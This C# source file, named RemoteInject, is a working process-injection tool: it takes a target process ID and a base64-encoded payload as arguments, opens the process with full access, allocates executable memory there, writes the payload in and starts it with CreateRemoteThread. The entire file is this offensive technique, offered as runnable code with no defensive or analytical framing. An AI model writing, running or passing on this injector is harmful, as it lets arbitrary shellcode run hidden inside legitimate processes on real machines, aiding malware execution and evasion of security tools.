using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

// PROCESS_ALL_ACCESS = 0x001F0FFF
// ExecuteReadWrite = 0x40
// Commit = 0x1000
// INFINITE = 0xFFFFFFFF

namespace RemoteInject
{
    class Program
    {
        public uint PROCESS_ALL_ACCESS = 0x001F0FFF;
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProc, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProc, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProc, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,  IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern int GetLastError();
        static void Main(string[] args)
        {
            int PID = Convert.ToInt32(args[0]);
            byte[] payload = Convert.FromBase64String(args[1]);

            Console.WriteLine("Opening Remote Process PID: {0}", PID);
            IntPtr hProc = OpenProcess(0x001F0FFF, false, PID);
            if(hProc == IntPtr.Zero)
            {
                Console.WriteLine("OpenProcess Failed. Error: {0}", GetLastError());
                return;
            }

            IntPtr mem;
            mem = VirtualAllocEx(hProc, IntPtr.Zero, (uint)payload.Length, 0x1000, 0x40);
            Console.WriteLine("mem allocated at 0x{0}", mem.ToString("X"));

            if(mem == IntPtr.Zero)
            {
                Console.WriteLine("VirtualAllocEx Failed. Error: {0}", GetLastError());
                return;
            }

            if(!WriteProcessMemory(hProc, mem, payload, payload.Length, out var bytes))
            {
                Console.WriteLine("WriteProcessMemory Failed. Error: {0}", GetLastError());
                return;
            }

            IntPtr hThread;
            hThread = CreateRemoteThread(hProc, IntPtr.Zero, 0, mem, IntPtr.Zero, 0, out var ThreadID);
            if(hThread == IntPtr.Zero)
            {
                Console.WriteLine("CreateRemoteThread Failed. Error: {0}", GetLastError());
                return;
            }
            Console.WriteLine("hThread located at 0x{0}", hThread.ToString("X"));
            Console.WriteLine("Payload executed inside the remote process PID: {0}", PID);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
            Console.WriteLine("WaitForSingleObject returned.");
        }
    }
}
